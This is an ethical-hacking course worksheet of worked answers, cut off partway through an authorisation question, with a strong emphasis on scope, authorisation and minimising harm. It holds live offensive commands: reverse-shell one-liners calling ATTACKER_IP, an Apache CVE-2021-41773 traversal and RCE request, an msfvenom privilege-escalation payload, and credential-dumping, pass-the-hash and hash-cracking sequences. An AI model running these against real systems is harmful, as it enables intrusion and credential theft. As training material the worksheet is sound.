# Month 7 — Practice Exercises: Ethical Hacking

**25 exercises with worked answers.**

---

## Section A: Reconnaissance (Questions 1-7)

**Q1.** You are conducting a black-box penetration test of a target company. List 10 pieces of information you can gather through passive OSINT without sending a single packet to the target.

**Answer:**
1. **IP address ranges** — ARIN/RIPE WHOIS for the company's registered ASN (Autonomous System Number) and associated IP blocks
2. **Registered domains** — WHOIS lookup for the company's domain registrar, registration date, name servers
3. **Subdomains** — Certificate Transparency logs (crt.sh), DNS brute-forcing using public resolvers (not querying their DNS directly)
4. **Employee names and emails** — LinkedIn employees, company website staff pages, theHarvester scanning email format (name@company.com)
5. **Technology stack** — Shodan.io for exposed services and banners, BuiltWith for web technologies, LinkedIn job listings (reveal tech used internally)
6. **Software versions and CVEs** — Shodan for server banners, open ports, version strings visible to internet crawlers
7. **Leaked credentials** — HaveIBeenPwned, Dehashed, credential dumps associated with company domain emails
8. **GitHub repositories** — search GitHub for the company's repository, find sensitive files, API keys in code history, internal architecture
9. **DNS records** — MX records reveal email provider (Google Workspace vs Exchange), TXT records reveal SPF/DMARC configuration, NS records
10. **Job postings** — what software they're hiring for reveals their internal stack. "Senior AWS engineer" + "experience with Splunk" reveals their SIEM and cloud provider.

---

**Q2.** Explain the difference between a SYN scan (-sS) and a TCP connect scan (-sT) in Nmap. When would you use each, and which is more detectable by an IDS?

**Answer:**
**SYN Scan (-sS):**
- Sends a SYN packet (first step of TCP handshake)
- If port is open: receives SYN-ACK → sends RST (never completes handshake)
- If port is closed: receives RST
- NEVER completes a full TCP connection
- Why it's called "stealth": doesn't appear in application logs (app only sees completed connections)
- Requires root/admin privileges (crafting raw packets)
- Faster than connect scan

**TCP Connect Scan (-sT):**
- Uses the OS's `connect()` system call to complete full TCP handshake
- If port is open: three-way handshake completes → sends RST to close
- If port is closed: RST received
- DOES complete a connection → appears in application logs
- Does NOT require root privileges (just normal socket operations)
- Slower than SYN scan

**Detection:** TCP connect scan is MORE detectable because:
- Completed connections appear in server logs
- Firewalls that only track completed connections will see it
- However, SYN scans ARE visible to modern IDS/IPS systems (most detect half-open connection patterns)

**When to use each:**
- Use SYN scan: when you have root access and want stealthier scanning (during internal pentests, early phases)
- Use TCP connect scan: when you don't have root, or when scanning from a machine where root isn't available

---

**Q3.** You have found that a target runs Apache 2.4.49 on Ubuntu. The CVE database shows CVE-2021-41773 affects this version. How do you proceed from here responsibly?

**Answer:**
**CVE-2021-41773 is the Apache Path Traversal / RCE vulnerability.** 

**Step 1 — Verify the scope:** Is Apache on this host within your pentest scope? Check your Rules of Engagement document. If the host or URL is listed as excluded, DO NOT test.

**Step 2 — Confirm the vulnerability before exploitation:**
```bash
# First confirm the version (don't trust the banner alone)
curl -I http://target.com     # Check Server header
nmap -sV --script http-headers target.com

# Check if CGI is enabled (required for RCE via this CVE)
# Path traversal test (safe, no exploitation):
curl "http://target.com/cgi-bin/.%2e/.%2e/.%2e/etc/passwd"
```

**Step 3 — Document the finding (without necessarily exploiting RCE):** Path traversal is already a Critical finding. You may not NEED to demonstrate RCE to prove the risk — reading `/etc/passwd` is sufficient proof.

**Step 4 — Demonstrate minimum necessary impact:** If the scope and client agreement require demonstrating exploitation, use a benign payload:
```bash
# Demonstrate RCE safely — only echo a benign string
curl "http://target.com/cgi-bin/.%2e/.%2e/.%2e/bin/sh" \
  --data "echo Content-Type: text/plain; echo; echo 'PENTEST-PROOF-OF-CONCEPT'"
```

**Step 5 — Report immediately (don't wait for final report):** Critical vulnerabilities (especially RCE) should be reported to the client immediately via secure channel, not held for the final report. The client may want to patch before you complete the rest of the test.

**Step 6 — Recommend remediation:** Upgrade to Apache 2.4.51 or later; if unable to patch immediately, disable CGI or add `<Directory />` to deny `Options FollowSymLinks`.

---

**Q4.** What is the difference between vulnerability scanning and penetration testing? Why do some organisations do both?

**Answer:**
**Vulnerability Scanning:**
- Automated tool (Nessus, OpenVAS, Qualys) compares detected services against CVE database
- Output: list of potential vulnerabilities with confidence levels
- Does NOT exploit — only identifies
- Can have false positives (reports vulnerability that doesn't actually affect this version)
- Fast (hours for an enterprise)
- Can be run regularly (weekly/monthly)
- Skilled analyst not required to run

**Penetration Testing:**
- Human attacker (or automated tools + human validation) actively tries to exploit vulnerabilities
- Output: proven exploitable vulnerabilities + business impact demonstration
- DOES exploit — demonstrates real impact
- No false positives (if you got a shell, the vulnerability is real)
- Slower (days to weeks for enterprise)
- Run periodically (annually, or after major changes)
- Requires skilled security professional

**Why do both:**
1. Vulnerability scanning covers more ground (all systems, frequently), but can't validate all findings
2. Pen testing validates the most critical findings and discovers chained/complex attack paths that scanners miss
3. Regulatory compliance often requires both: DPDP, PCI-DSS, ISO 27001 auditors want to see both
4. Scanners find the low-hanging fruit; pen testers find what an attacker would actually exploit when low-hanging fruit is remediated

---

**Q5.** Using Nmap NSE scripts, how would you check if a Windows target is vulnerable to EternalBlue (MS17-010)? What precautions should you take before running this check?

**Answer:**
**Precautions first (important):**
1. Confirm the target IP is in scope (check your RoE)
2. Confirm the target is a test system — EternalBlue can cause instability in Windows XP/2003 (may crash)
3. Run during an agreed maintenance window if it's a production system
4. Have contact information for the client's IT team to restore if something goes wrong

**The check:**
```bash
# Check for MS17-010 (EternalBlue vulnerability) — detect-only, no exploitation
nmap -p 445 --script smb-vuln-ms17-010 192.168.1.100

# Output if vulnerable:
# Host script results:
# | smb-vuln-ms17-010: 
# |   VULNERABLE:
# |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
# |     State: VULNERABLE
# |     Risk factor: HIGH

# Also check general SMB vulnerabilities
nmap -p 445 --script smb-vuln-* 192.168.1.100
```

**Interpreting results:**
- `State: VULNERABLE` — confirm SMB signing status and if SMBv1 is enabled
- Always cross-reference with Tenable/Qualys plugin output if available
- The Nmap script checks for the vulnerability signature without exploiting — safe to run

**If vulnerable:** Report as Critical immediately. Do not run the actual exploit module (EternalBlue can cause system crashes in older Windows versions) unless explicitly required by the client and you have a maintenance window.

---

**Q6.** A penetration tester asks: "I found an open S3 bucket with confidential data. The tester before me said they downloaded all the data to demonstrate the impact to the client. Is this right?" What is the correct approach?

**Answer:** **Downloading all confidential data is NOT the correct approach** — even in a pentest context.

**Why not:**
1. **Minimise harm principle:** The goal of pentesting is to demonstrate risk, not maximise damage. You only need to demonstrate that the data is accessible, not take all of it.
2. **Data protection laws:** You as the tester now possess confidential data that may include PII, trade secrets, financial data. This creates legal obligations and risks for your firm.
3. **Client trust:** If you download 10GB of customer data to "prove" the vulnerability, that's an unnecessary risk to customer privacy.
4. **Chain of custody issues:** How do you securely handle, store, transmit, and destroy that data?

**Correct approach:**
1. **Document the existence:** Screenshot of the bucket listing (files visible, no contents)
2. **Access one non-sensitive file** to prove read access (a readme or an obviously public file)
3. **Note the number of files and approximate total size** without downloading all
4. **Classify the data:** are filenames visible enough to confirm what type of data it is? (e.g., "2024_customer_PII.csv" — the filename alone proves sensitivity)
5. **Report immediately:** S3 bucket with confidential data is Critical — call the client immediately, don't wait for the final report
6. **Recommend closure:** The client should make the bucket private or add bucket policies immediately

---

**Q7.** Write a Python script that performs a port scan using TCP connect() to scan common ports on a target and report open services.

**Answer:**
```python
import socket
import concurrent.futures
from datetime import datetime

# Common ports and their typical service names
COMMON_PORTS = {
    21: "FTP",     22: "SSH",      23: "Telnet",  25: "SMTP",
    53: "DNS",     80: "HTTP",     110: "POP3",    143: "IMAP",
    443: "HTTPS",  445: "SMB",     3306: "MySQL",  3389: "RDP",
    5432: "PostgreSQL", 6379: "Redis", 8080: "HTTP-Alt", 8443: "HTTPS-Alt",
    27017: "MongoDB", 5900: "VNC", 5000: "Flask/Gunicorn", 9200: "Elasticsearch"
}

def scan_port(host: str, port: int, timeout: float = 1.0) -> tuple[int, bool, str]:
    """Attempt TCP connection to host:port. Returns (port, is_open, banner)."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            result = s.connect_ex((host, port))
            if result == 0:
                # Try to grab banner
                try:
                    s.send(b"HEAD / HTTP/1.0\r\n\r\n")
                    banner = s.recv(1024).decode('utf-8', errors='ignore').split('\r\n')[0]
                except Exception:
                    banner = ""
                return port, True, banner
    except (socket.error, OSError):
        pass
    return port, False, ""

def scan_host(host: str, ports: list[int] | None = None) -> None:
    """Scan a host for open ports."""
    if ports is None:
        ports = list(COMMON_PORTS.keys())
    
    # Resolve hostname
    try:
        ip = socket.gethostbyname(host)
    except socket.gaierror:
        print(f"[!] Cannot resolve {host}")
        return
    
    print(f"\n[*] Starting port scan of {host} ({ip})")
    print(f"[*] Scanning {len(ports)} ports at {datetime.now().strftime('%H:%M:%S')}")
    print("-" * 55)
    
    open_ports = []
    
    # Concurrent scanning (50 threads)
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(scan_port, ip, port): port for port in ports}
        for future in concurrent.futures.as_completed(futures):
            port, is_open, banner = future.result()
            if is_open:
                service = COMMON_PORTS.get(port, "Unknown")
                open_ports.append((port, service, banner))
    
    # Sort and display results
    open_ports.sort(key=lambda x: x[0])
    
    if open_ports:
        print(f"\n{'PORT':<10} {'SERVICE':<15} {'BANNER/INFO'}")
        print("-" * 55)
        for port, service, banner in open_ports:
            banner_short = banner[:40] if banner else ""
            print(f"{port:<10} {service:<15} {banner_short}")
    else:
        print("[*] No open ports found in common ports list")
    
    print(f"\n[*] Scan complete. {len(open_ports)} open port(s) found.")

# Usage — ONLY on systems you own or have permission to test
# scan_host("192.168.1.100")
# scan_host("192.168.1.100", [22, 80, 443, 8080])
```

---

## Section B: Exploitation (Questions 8-15)

**Q8.** Explain the anatomy of a Metasploit module. What is the difference between an exploit and an auxiliary module?

**Answer:**
**Exploit module:**
- Targets a specific vulnerability to gain code execution or unauthorised access
- Has a `check()` method (optional): detects if target is vulnerable without exploiting
- Has an `exploit()` method: delivers the payload
- Requires a PAYLOAD (what code runs after exploitation — reverse shell, Meterpreter, etc.)
- Result: if successful, opens a session (shell or Meterpreter)

**Auxiliary module:**
- Does NOT gain code execution
- Covers: scanners, brute-forcers, fuzzers, sniffers, denial-of-service tools, exploit helpers
- Has a `run()` method
- Does NOT require a payload
- Examples: `auxiliary/scanner/http/http_version`, `auxiliary/scanner/smb/smb_ms17_010`, `auxiliary/brute/ftp/ftp_login`

**Anatomy of an exploit module:**
```ruby
require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  include Msf::Exploit::Remote::Tcp   # Mixin for TCP connections
  
  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Vulnerable Service RCE',
      'Description' => 'Remote code execution via buffer overflow in X',
      'Author'      => ['Original Researcher', 'MSF Port'],
      'License'     => MSF_LICENSE,
      'References'  => [['CVE', '2024-12345'], ['URL', 'https://...']],
      'Targets'     => [['Windows x64', {'Arch' => ARCH_X64}]],
      'DefaultTarget' => 0,
      'Payload'     => {'Space' => 400, 'BadChars' => "\x00\x0a\x0d"}
    ))
    register_options([Opt::RHOST(), Opt::RPORT(9999)])
  end
  
  def exploit
    connect
    sock.put(payload.encoded)  # Send the payload
    handler  # Set up listener for reverse connection
    disconnect
  end
end
```

---

**Q9.** What is Meterpreter and how does it differ from a standard command shell? List 5 Meterpreter commands and what each does.

**Answer:**
**Standard shell:** A basic command shell (`/bin/bash`, `cmd.exe`). Limited to what the OS shell supports. Traffic is cleartext. No encryption. No built-in post-exploitation features.

**Meterpreter:** Advanced post-exploitation payload that runs entirely in memory (no file on disk). Features:
- **Encrypted communication** over SSL/TLS (evades some IDS)
- **Runs in process memory** — doesn't write to disk (fileless)
- **Cross-platform** (Windows, Linux, macOS, Android)
- **Extensible** — can load additional modules at runtime
- **Native API access** — can interact with OS at a low level

**5 Meterpreter commands:**
```bash
sysinfo           # OS version, hostname, architecture, locale
getuid            # Current user running the Meterpreter process
getsystem         # Attempt common Windows privilege escalation techniques
hashdump          # Dump local SAM database (password hashes)
load kiwi         # Load Kiwi (Mimikatz) extension for credential extraction
creds_all         # (after load kiwi) Dump all plaintext credentials from memory
screenshare       # Start live screenshot stream of the target's screen
keylog_recorder   # Start keylogger (log to local file)
upload /path/src /path/dst  # Upload file from attacker to target
download /path/src /path/dst # Download file from target to attacker
execute -f cmd.exe -a "/c whoami"  # Execute a command on the target
portfwd add -l 3306 -p 3306 -r 192.168.1.200  # Port forward to internal host
```

---

**Q10.** Explain the Windows Password Hash. What is NTLM and how does Hashcat crack it?

**Answer:**
**Windows Password Storage:**
Windows stores passwords as NTLM hashes in the SAM (Security Account Manager) database (`C:\Windows\System32\config\SAM`). The SAM is locked while Windows is running — requires SYSTEM privileges or offline access.

**NTLM Hash:**
```
NTLM = MD4(UTF-16LE(password))
```
Example: `Password123` → NTLM: `58a478135a93ac3bf058a5ea0e8fdb71`

**Properties:**
- Fixed length (32 hex characters = 128 bits)
- No salt (same password = same hash across all Windows systems)
- Fast to compute (can compute billions per second on GPU)
- Not suitable for password storage by modern standards

**Hashcat cracking process:**
```bash
# Step 1: Get the NTLM hashes (from Meterpreter: hashdump, or from secretsdump.py)
# Format: username:SID:LM_hash:NTLM_hash:::
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::

# Extract just NTLM hashes
cut -d: -f4 hashes.txt > ntlm_only.txt

# Step 2: Crack with wordlist
hashcat -m 1000 ntlm_only.txt /usr/share/wordlists/rockyou.txt

# Step 3: Add rules for common mutations (Password1, P@ssw0rd, etc.)
hashcat -m 1000 ntlm_only.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Step 4: Brute force short passwords (if wordlist fails)
hashcat -m 1000 ntlm_only.txt -a 3 ?u?l?l?l?l?d?d  # Pattern: Capital+4lower+2digits
```

**Speed context:** A modern GPU (RTX 4090) can compute ~100 billion NTLM hashes per second. 8-character password space exhausted in minutes. This is why NTLM is considered broken for password storage.

---

**Q11.** What is Pass-the-Hash (PtH) and why is it significant? How does it work technically?

**Answer:**
**Pass-the-Hash:** An attack where an attacker uses a captured NTLM hash directly for authentication — WITHOUT needing to crack the hash to find the plaintext password.

**Why it's significant:**
- NTLM authentication protocols accept the hash directly (the hash IS the credential in NTLMv1)
- Cracking is not necessary — capturing the hash = owning the account
- One compromised server → dump hashes → use hashes to access every other server where that account is used
- Lateral movement in Active Directory environments becomes trivial

**How it works technically:**
```
Normal NTLM Authentication:
1. Client connects to server
2. Server sends a random challenge (8 bytes)
3. Client computes: NTLMv2 response = HMAC-MD5(NT_HASH, challenge + other_data)
4. Server verifies response

Pass-the-Hash:
1. Attacker captures NT_HASH (from hashdump, secretsdump, etc.)
2. Uses a PtH tool to inject the hash into the NTLM authentication process
3. Computes NTLMv2 response using the captured hash (just like the real client would)
4. Server accepts the authentication — cannot distinguish from legitimate
```

**Tools:**
```bash
# Impacket's smbclient with hash
impacket-smbclient -hashes :58a478135a93ac3bf058a5ea0e8fdb71 domain/Administrator@target

# Metasploit modules
use exploit/windows/smb/psexec
set SMBPass aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71

# Mimikatz
sekurlsa::pth /user:Administrator /domain:corp /ntlm:58a478135a93ac3bf058a5ea0e8fdb71
```

**Defence:** Microsoft introduced Protected Users security group and Credential Guard (uses virtualisation to protect LSASS) specifically to mitigate PtH attacks. Also: disable NTLMv1, enable SMB signing.

---

**Q12.** What is privilege escalation and why is it necessary in most penetration tests? Give 3 examples of Windows privilege escalation techniques.

**Answer:**
**Why it's necessary:** Initial access typically grants low-privilege access (regular user, limited permissions). To achieve the pentest objectives (access sensitive data, move laterally, demonstrate business impact), a pentester usually needs SYSTEM or Administrator privileges.

**3 Windows privilege escalation techniques:**

**1. Unquoted service paths:**
```powershell
# Windows service with unquoted path with spaces:
# HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\VulnService
# ImagePath = C:\Program Files\Vulnerable Service\service.exe
#
# Windows searches: C:\Program.exe → C:\Program Files\Vulnerable.exe → correct path
# If attacker can create C:\Program.exe → it runs as SYSTEM
wmic service get name,startname,pathname | findstr /i /v '"' | findstr /i ".exe"
```

**2. AlwaysInstallElevated:**
```powershell
# Check if set (must be 1 in BOTH keys)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If 1 in both → any user can install MSI files as SYSTEM
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f msi > evil.msi
msiexec /quiet /qn /i evil.msi
```

**3. Weak service permissions:**
```powershell
# AccessChk (Sysinternals — can be uploaded) to find services current user can modify
accesschk.exe -uwcqv * /accepteula

# If you can reconfigure a service that runs as SYSTEM:
sc config VulnerableService binpath="C:\Users\lowpriv\evil.exe"
net stop VulnerableService
net start VulnerableService  # Now evil.exe runs as SYSTEM
```

---

**Q13.** A Metasploit exploit fails with "Exploit completed, but no session was created." List 5 reasons why this might happen and how to diagnose each.

**Answer:**

1. **Target is not actually vulnerable:**
   - Diagnose: Run `check` (if the module has it). Look at the Nmap version more carefully. Is the patch level actually vulnerable?
   - Fix: Use `scanner/smb/smb_ms17_010` to confirm vulnerability before running exploit

2. **Wrong target configuration:**
   - Diagnose: `show targets` — are you using the right architecture (x86 vs x64)? Wrong target = payload space calculations wrong → crash, not shell
   - Fix: Use `-A` Nmap flag to detect OS and arch; set the correct Target

3. **Payload not being received (firewall blocking inbound):**
   - Diagnose: Is your LHOST reachable from the target? If using `reverse_tcp`, the target connects back to you — does the target have internet access to your machine? Can you ping your LHOST from the target?
   - Fix: Use `bind_tcp` payload instead (you connect to target), or check firewall rules, or use `windows/meterpreter/reverse_https` (HTTPS may be allowed)

4. **Bad characters in payload:**
   - Diagnose: Check the exploit's documentation for bad characters. The default payload may contain characters the vulnerable service strips.
   - Fix: Set `BADCHARS` in the exploit, or use a payload encoder (`set EnableStageEncoding true`)

5. **LHOST set incorrectly:**
   - Diagnose: `show options` — is LHOST your actual IP? Common mistake: it's set to 127.0.0.1 or a VPN IP the target can't reach.
   - Fix: `set LHOST $(curl -s ifconfig.me)` for external IP, or use your correct internal IP

---

**Q14.** What is the difference between a physical penetration test and a cyber penetration test? What unique considerations apply to physical pentests?

**Answer:**
**Cyber Pentest:** Remote testing of network and application security. Conducted entirely digitally from a remote location or client's premises (internal test). Majority of pentests are cyber-focused.

**Physical Pentest:** Testing the physical security controls — can an attacker walk into the building, access server rooms, plug in a device, or steal equipment?

**Physical pentest techniques:**
- Tailgating/piggybacking through access-controlled doors
- Social engineering receptionists or employees (impersonating IT support, delivery person)
- Badge cloning (RFID cloning with a hidden reader)
- Lock picking (requires specific legal agreements)
- USB drop attacks (leave a malicious USB drive in the car park)

**Unique considerations for physical pentests:**
1. **Written authorisation is even more critical:** A physical pentester caught without documentation will be arrested. The authorisation letter must specify: allowed locations, allowed dates/times, contact information for the security team to call for verification.
2. **Get-out-of-jail letter:** A specific, signed letter stating you are an authorised tester. Laminate it. Have the CISO or physical security head's phone number.
3. **Covert vs overt testing:** Covert = test without notifying security (tests real-world detection). Overt = security team knows you're coming (tests access controls only). Agree with client in advance.
4. **Evidence:** Take photos/video of everything you access — both to demonstrate findings and to protect yourself.
5. **No-arrest guarantee:** Agree in advance with the client AND their legal team AND their security team that no arrests will be made during the test. Some large companies have their own private security that may act independently of IT.

---

**Q15.** Write the command sequence to use Impacket's secretsdump.py to remotely extract NTLM hashes from a Windows machine you have admin credentials for.

**Answer:**
```bash
# Install Impacket
pip install impacket
# or
git clone https://github.com/fortra/impacket
cd impacket && pip install -r requirements.txt

# secretsdump.py — remotely dump SAM, SYSTEM, LSA secrets, and DC NTDS.dit
# Requires: Administrator credentials or NTLM hash

# Method 1: With plaintext credentials
python3 secretsdump.py domain/Administrator:Password123@192.168.1.100

# Method 2: With hash (Pass-the-Hash)
python3 secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71 \
    domain/Administrator@192.168.1.100

# Method 3: From a Domain Controller (dump entire NTDS.dit)
python3 secretsdump.py domain/Administrator:Password123@10.0.0.1 -just-dc

# Output format:
# [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
# Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# DESKTOP-ABC$:1001:aad3b435b51404eeaad3b435b51404ee:...:::

# [*] Dumping cached domain logon information (domain/username:hash)
# domain.local/jsmith:$DCC2$10240#jsmith#a4bb4c0e143...

# [*] Dumping LSA Secrets
# DPAPI_SYSTEM: ...
# $MACHINE.ACC: domain.local\DESKTOP-ABC$:...

# After getting hashes:
# 1. Sort and deduplicate
cut -d: -f4 dump.txt | sort -u > ntlm_hashes.txt
# 2. Crack with hashcat
hashcat -m 1000 ntlm_hashes.txt rockyou.txt
```

---

## Section C: Post-Exploitation (Questions 16-20)

**Q16.** Explain lateral movement in the context of a Windows Active Directory environment. Describe 3 methods with tools.

**Answer:** Lateral movement is the technique of using access on one compromised host to access additional systems in the network — moving "laterally" (same privilege level) or "vertically" (increasing privilege) across the network.

**In Active Directory:** Compromise one workstation → dump credentials → use those credentials to access file servers, other workstations, and eventually the Domain Controller.

**3 Methods:**

**1. Pass-the-Hash via PsExec:**
```bash
# Upload a payload and execute on a remote machine using captured hash
impacket-psexec -hashes :NTLM_HASH domain/Administrator@192.168.1.200
# Gives SYSTEM shell on the remote machine
```

**2. WMI (Windows Management Instrumentation):**
```bash
# Execute command on remote system via WMI
impacket-wmiexec domain/Administrator:Password@192.168.1.200 "whoami"
# More stealthy than psexec — no service creation in event logs
```

**3. Kerberoasting (credential access enabling lateral movement):**
```bash
# Find service accounts with SPNs
impacket-GetUserSPNs domain.local/user:password -dc-ip 10.0.0.1 -request
# This dumps Kerberos TGS tickets for service accounts
# Crack offline with hashcat -m 13100 (Kerberos TGS-REP etype 23)
# Service accounts often have weak passwords and high privileges
```

---

**Q17.** What is a "C2 framework" and how is Cobalt Strike used in red team operations? What are the legitimate uses of C2 frameworks?

**Answer:**
**C2 (Command and Control) Framework:** Software that provides infrastructure for managing compromised endpoints — communication, tasking, data collection, and persistence at scale.

**Components:**
- **Teamserver:** Central server that manages all beacons
- **Beacon/Agent:** Lightweight implant on the compromised host that checks in periodically
- **Operator client:** Interface for red team operators to issue commands

**Cobalt Strike workflow:**
1. Attacker runs Cobalt Strike teamserver on VPS
2. Generates a beacon payload (executable, DLL, PowerShell, etc.)
3. Delivers beacon via phishing, exploit, or physical access
4. Beacon checks in to teamserver every 60 seconds (configurable sleep/jitter)
5. Red team operator sees beacon check-in → issue tasks: run commands, dump hashes, take screenshots, pivot
6. Beacon executes tasks and returns results on next check-in

**Legitimate uses:**
- Red team operations for authorised penetration testing
- Security research and tool development
- Blue team training (to understand what defending against real tools looks like)
- Malware analysis and emulation

**Important:** Cobalt Strike is a paid tool (~$3,500/year) requiring licensing to legitimately own. Cracked versions are widely used by actual criminal threat actors — making it both a defender concern (blue teams must detect it) and an ethical boundary (only use licensed versions for authorised work).

---

**Q18.** Write a Python script that performs a basic directory bruteforce against a web server using a wordlist.

**Answer:**
```python
import requests, sys, time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

def check_path(base_url: str, path: str, session: requests.Session) -> tuple[str, int, int]:
    """Check if a path exists on the web server."""
    url = f"{base_url.rstrip('/')}/{path.lstrip('/')}"
    try:
        response = session.get(url, timeout=3, allow_redirects=False)
        return url, response.status_code, len(response.content)
    except (requests.RequestException, ConnectionError):
        return url, 0, 0

def dir_brute(base_url: str, wordlist_path: str, 
              threads: int = 20, delay: float = 0.0) -> list:
    """Bruteforce directories on a web server."""
    
    # Load wordlist
    wordlist = Path(wordlist_path).read_text().splitlines()
    wordlist = [w.strip() for w in wordlist if w.strip() and not w.startswith('#')]
    
    # Include common extensions
    extensions = ['', '.php', '.html', '.txt', '.bak', '.old', '.config']
    paths = []
    for word in wordlist:
        for ext in extensions:
            paths.append(f"{word}{ext}")
    
    print(f"[*] Target: {base_url}")
    print(f"[*] Testing {len(paths)} paths ({len(wordlist)} words × {len(extensions)} extensions)")
    print(f"[*] Threads: {threads}\n")
    
    interesting_codes = {200, 201, 204, 301, 302, 307, 401, 403, 500}
    found = []
    
    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0 (PenTest — Authorized)'})
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(check_path, base_url, path, session): path 
                   for path in paths}
        
        for i, future in enumerate(as_completed(futures), 1):
            url, status, size = future.result()
            
            if status in interesting_codes:
                status_label = {200: "[FOUND]", 301: "[REDIR]", 403: "[FORBID]", 
                               401: "[AUTH]", 500: "[ERROR]"}.get(status, f"[{status}]")
                print(f"{status_label} {url} (size: {size})")
                found.append({"url": url, "status": status, "size": size})
            
            if delay:
                time.sleep(delay)
    
    print(f"\n[*] Complete. Found {len(found)} interesting paths.")
    return sorted(found, key=lambda x: x['status'])

# Usage (only on systems you own or have permission to test):
# results = dir_brute("http://localhost", "/usr/share/wordlists/dirb/common.txt", threads=10)
```

---

**Q19.** What is the PTES (Penetration Testing Execution Standard) and what phases does it define?

**Answer:** PTES (ptes.org) is an industry standard framework that defines what a comprehensive penetration test looks like. It ensures consistency and completeness across different practitioners.

**7 Phases:**

1. **Pre-Engagement Interactions:** Before testing begins — scope definition, legal agreements, rules of engagement, defining success criteria, NDA signing, emergency contact establishment

2. **Intelligence Gathering:** OSINT and reconnaissance — everything that can be learned without active network scanning. Tools: theHarvester, Maltego, Shodan, LinkedIn, Whois

3. **Threat Modelling:** Based on OSINT, build a threat model — who would attack this organisation? What would they want? What attack paths would they take? Prioritise testing accordingly.

4. **Vulnerability Analysis:** Active scanning and enumeration — Nmap, vulnerability scanners, service enumeration. Identify what's potentially vulnerable.

5. **Exploitation:** Attempt to exploit identified vulnerabilities. Confirm they're real (not scanner false positives). Gain initial access.

6. **Post Exploitation:** What happens after initial access? Privilege escalation, lateral movement, data access, persistence. This phase demonstrates business impact beyond "yes, the vulnerability exists."

7. **Reporting:** Write a professional report with executive summary, methodology, findings, evidence, and remediation guidance. The report is the primary deliverable — without it, the pentest is worthless.

**Why PTES matters:** Before PTES, pentests varied wildly. One firm might just run Nessus and call it a pentest. PTES defines minimum standards, making it easier for clients to compare proposals and ensure quality.

---

**Q20.** What does "getting a reverse shell" mean? Explain the difference between a bind shell and a reverse shell, and why reverse shells are more commonly used in pentesting.

**Answer:**
**Shell:** A command-line interface to execute commands on a system.

**Bind Shell:**
- The compromised system OPENS a listening port
- The attacker CONNECTS TO that port
- Like a traditional telnet/SSH connection
- Problem: the target's firewall may block inbound connections to that port
- Problem: the attacker's IP is in the outbound connection logs of the target

**Reverse Shell:**
- The compromised system INITIATES a connection outbound to the attacker's listener
- The attacker listens for incoming connections (`nc -lvnp 4444`)
- Why it works: OUTBOUND connections from the target are usually allowed (the machine needs to browse the internet, update software, etc.)
- The target's firewall blocks inbound but allows outbound → reverse shell works

**Common reverse shell commands:**
```bash
# Attacker sets up listener
nc -lvnp 4444

# On target (if they have bash):
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python (if target has Python):
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PowerShell (Windows):
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){...}"

# Msfvenom payload generation:
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf > shell.elf
```

**In Metasploit:** The `reverse_tcp` and `reverse_https` payloads use this technique. Metasploit's `exploit/multi/handler` is the listener.

---

## Section D: Reporting and Ethics (Questions 21-25)

**Q21.** What is "responsible disclosure" and what is "full disclosure"? Which approach do most security professionals advocate and why?

**Answer:**
**Responsible Disclosure (Coordinated Disclosure):**
1. Researcher finds vulnerability in a vendor's product
2. Reports privately to the vendor (often via security@vendor.com or a HackerOne programme)
3. Gives vendor a reasonable time to fix (typically 90 days — Google Project Zero's standard)
4. If vendor fixes within 90 days: researcher publishes details after patch is released (often simultaneously)
5. If vendor doesn't fix in 90 days: researcher publishes anyway (with or without a fix) — the deadline creates urgency

**Full Disclosure:**
- Publish all vulnerability details immediately upon discovery, without notifying the vendor
- Rationale: forces vendors to react quickly; users deserve to know so they can take protective action
- Criticism: exploits are available before a patch exists; attackers can use the published details

**What most security professionals advocate:** Responsible/Coordinated Disclosure. Reasons:
1. Vendors need time to develop, test, and distribute patches across all affected systems globally
2. Publishing before a patch means attackers can exploit users who can't yet protect themselves
3. The 90-day deadline has proven effective at creating urgency without giving vendors unlimited time
4. Major CVEs (Log4j, Heartbleed) followed coordinated disclosure — fixes were released simultaneously with public announcement

**Bug bounty programmes** formalise this: researchers report → company triages → company fixes → researcher paid → coordinated announcement.

---

**Q22.** A junior tester on your team says "I have a Metasploit exploit that works against the target but I haven't received written authorisation yet — should I just run it quickly to see if it works?" What do you say and why?

**Answer:** **Absolutely not.** Stop immediately. This is a direct criminal act.

**What you tell them:**
1. **Without written authorisation, running an exploit against any system is a computer crime.** In India, this violates Section 43 and Section 66 of the IT Act 2000. In the UK it's the Computer Misuse Act. In the US it's the CFAA. Verbal agreement or "we're probably going to get the contract" is NOT legal authorisation.

